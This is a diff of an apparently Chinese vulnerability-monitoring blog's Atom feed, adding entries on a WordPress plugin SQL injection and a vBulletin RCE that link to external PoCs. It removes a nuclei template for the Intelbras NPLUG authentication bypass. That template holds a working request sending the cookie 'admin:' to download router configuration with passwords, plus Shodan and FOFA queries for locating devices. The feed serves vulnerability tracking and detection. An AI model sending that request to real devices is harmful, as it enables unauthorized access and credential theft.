@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-04T01:02:27.006Z</updated>
+  <updated>2025-06-04T01:30:27.223Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,68 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>WordPress Likes and Dislikes SQL注入漏洞</title>
+    <link href="http://example.com/2025/06/04/github_465259957/"/>
+    <id>http://example.com/2025/06/04/github_465259957/</id>
+    <published>2025-06-04T01:30:27.225Z</published>
+    <updated>2025-06-04T01:30:27.223Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> WordPress Likes and Dislikes SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5287</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> WordPress Likes and Dislikes插件存在SQL注入漏洞，攻击者可以利用此漏洞执行恶意SQL命令，可能导致数据泄露或其他恶意操作。</p><p><strong>产品厂商：</strong> WordPress</p><p><strong>产品名称：</strong> WordPress Likes and Dislikes</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12242">https://github.com/projectdiscovery/nuclei-templates/issues/12242</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### Is there an existing template for this?<br><br>- [x] I have searched the existing templates.<br><br>### Template requests<br><br>- ...<br>CVE<span class="hljs-number">-2025</span><span class="hljs-number">-5287</span><br>*<br>WordPress Likes and Dislikes - SQL Injection <br>*<br>PoC (https:<span class="hljs-comment">//github.com/wiseep/CVE-2025-5287/blob/main/CVE-2025-5287.py)</span><br><br>### Anything else?<br><br>_No response_<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; WordPress Likes and Dislikes SQL注入漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2025-528</summary>
+      
+    
+    
+    
+    <category term="Github Poc 监控" scheme="http://example.com/categories/Github-Poc-%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+    <category term="CVE-2025-5287" scheme="http://example.com/tags/CVE-2025-5287/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>vBulletin Unauthenticated API Access Vulnerability</title>
+    <link href="http://example.com/2025/06/04/github_1286802768/"/>
+    <id>http://example.com/2025/06/04/github_1286802768/</id>
+    <published>2025-06-04T01:30:16.265Z</published>
+    <updated>2025-06-04T01:30:16.263Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> vBulletin Unauthenticated API Access Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48827</li></ul><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> vBulletin存在未授权API访问漏洞，攻击者可以利用此漏洞无需认证即可访问API接口，可能导致远程代码执行。</p><p><strong>产品厂商：</strong> vBulletin</p><p><strong>产品名称：</strong> vBulletin</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12243">https://github.com/projectdiscovery/nuclei-templates/issues/12243</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### Is there an existing template for this?<br><br>- [x] I have searched the existing templates.<br><br>### Template requests<br><br>CVE<span class="hljs-number">-2025</span><span class="hljs-number">-48827</span><br>*<br>Unauthenticated API Access <span class="hljs-keyword">in</span> vBulletin<br>*<br>WriteUP (https:<span class="hljs-comment">//karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce)</span><br>*<br>POC (https:<span class="hljs-comment">//karmainsecurity.com/pocs/vBulletin-replaceAdTemplate-RCE.php)</span><br><br>### Anything else?<br><br>_No response_<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; vBulletin Unauthenticated API Access Vulnerability&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong</summary>
+      
+    
+    
+    
+    <category term="Github Poc 监控" scheme="http://example.com/categories/Github-Poc-%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    
+    <category term="CVE-2025-48827" scheme="http://example.com/tags/CVE-2025-48827/"/>
+    
+  </entry>
   
   <entry>
     <title>2025 年 6 月安卓安全更新修复 30 多个漏洞</title>
@@ -544,63 +606,6 @@
     <category term="CVE-2025-5419" scheme="http://example.com/tags/CVE-2025-5419/"/>
     
     <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>vBulletin replaceAdTemplate 远程代码执行漏洞 (CVE-2025-48827)</title>
-    <link href="http://example.com/2025/06/03/weixin_3330510392/"/>
-    <id>http://example.com/2025/06/03/weixin_3330510392/</id>
-    <published>2025-06-03T13:52:15.842Z</published>
-    <updated>2025-06-03T13:52:15.838Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/EhACVdeQRtsJ2SgFZ-HYHw">https://mp.weixin.qq.com/s/EhACVdeQRtsJ2SgFZ-HYHw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/EhACVdeQRtsJ2SgFZ-HYHw&quot;&gt;https://mp.weixin.qq.com/s/EhACVdeQRtsJ2SgFZ-HYHw&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Intelbras NPLUG 认证绕过漏洞</title>
-    <link href="http://example.com/2025/06/03/github_436960885/"/>
-    <id>http://example.com/2025/06/03/github_436960885/</id>
-    <published>2025-06-03T13:46:20.970Z</published>
-    <updated>2025-06-03T13:46:20.967Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Intelbras NPLUG 认证绕过漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-12455</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Intelbras NPLUG 1.0.0.14存在认证绕过漏洞，攻击者可以通过设置名为”admin:”的cookie绕过认证。</p><p><strong>产品厂商：</strong> Intelbras</p><p><strong>产品名称：</strong> NPLUG</p><p><strong>影响版本：</strong> 1.0.0.14</p><p><strong>搜索语法：</strong> html:”NPLUG”, title&#x3D;”NPLUG”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/4b7f0f1bc1012461c49df8d18c482d849a9f34e0/http%2Fcves%2F2018%2FCVE-2018-12455.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/4b7f0f1bc1012461c49df8d18c482d849a9f34e0/http%2Fcves%2F2018%2FCVE-2018-12455.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">12455</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Intelbras NPLUG <span class="hljs-number">1.0</span>.<span class="hljs-number">0.14</span> <span class="hljs-operator">-</span> Authentication Bypass<br>  <span class="hljs-params">author:</span> ritikchaddha<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Intelbras NPLUG <span class="hljs-number">1.0</span>.<span class="hljs-number">0.14</span> is vulnerable to authentication bypass through cookie manipulation. An attacker can bypass authentication by simply setting a cookie named <span class="hljs-string">&quot;admin:&quot;</span>.<br>  <span class="hljs-params">remediation:</span> |<br>    Update the device firmware to the latest version.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//seclists.org/fulldisclosure/2018/Oct/18</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2018-12455</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:H<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">8.1</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">12455</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">287</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:h:intelbras:nplug:-:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">vendor:</span> intelbras<br>    <span class="hljs-params">product:</span> nplug<br>    <span class="hljs-params">shodan-query:</span> html:<span class="hljs-string">&quot;NPLUG&quot;</span><br>    <span class="hljs-params">fofa-query:</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;NPLUG&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2018,intelbras,auth-bypass,iot<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/cgi-bin/DownloadCfg/RouterCfm.cfg</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Cookie:</span> <span class="hljs-params">admin:</span><br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;contains(content_type, &#x27;config/conf&#x27;)&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;contains_all(body, &#x27;wl_&#x27;, &#x27;_passwd&#x27;)&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;status_code==200&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Intelbras NPLUG 认证绕过漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2018-12455&lt;/li&gt;
-&lt;/ul&gt;
-</summary>
-      
-    
-    
-    
-    <category term="Github Poc 监控" scheme="http://example.com/categories/Github-Poc-%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
-    
-    <category term="CVE-2018-12455" scheme="http://example.com/tags/CVE-2018-12455/"/>
     
   </entry>
   
